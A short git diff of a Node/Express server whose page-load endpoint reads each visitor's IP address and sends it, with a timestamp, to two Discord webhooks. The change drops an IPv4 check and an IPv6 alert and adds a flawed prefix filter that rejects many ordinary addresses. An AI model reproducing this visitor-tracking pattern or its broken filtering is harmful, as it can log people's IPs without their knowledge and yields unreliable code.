@@ -5,7 +5,6 @@ const axios = require('axios');
 const compression = require('compression');
 const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
-const { isIPv4 } = require('net');
 const app = express();
 const port = process.env.PORT || 4000;
 
@@ -110,7 +109,6 @@ async function sendDiscordWebhooks(ip, timestamp) {
         }]
     });
 
-
     try {
         await axios.all([webhook1, webhook2]);
     } catch (error) {
@@ -120,21 +118,12 @@ async function sendDiscordWebhooks(ip, timestamp) {
 
 
 
+
 app.post('/page-loaded', async (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     if (typeof ip === 'string') ip = ip.split(',')[0].trim();
-    if (isIPv4(ip) == false) {
-        return res.status(400).send('Invalid IP'), console.log('Invalid IP'), axios.post(discordWebhookUrl, {
-            embeds: [{
-                title: 'IP Invalido',
-                description: `Usuario com ipv6.`,
-                color: 5814783,
-                fields: [
-                    { name: 'IP', value: ip, inline: true },
-                ],
-                footer: { text: 'IPV6' },
-            }]
-        });
+    if (ip.startsWith('3') || ip.startsWith('10') || ip.startsWith('r')) {
+        return res.status(400).send('Invalid IP');
     }
 
     let timestamp = new Date().toISOString();
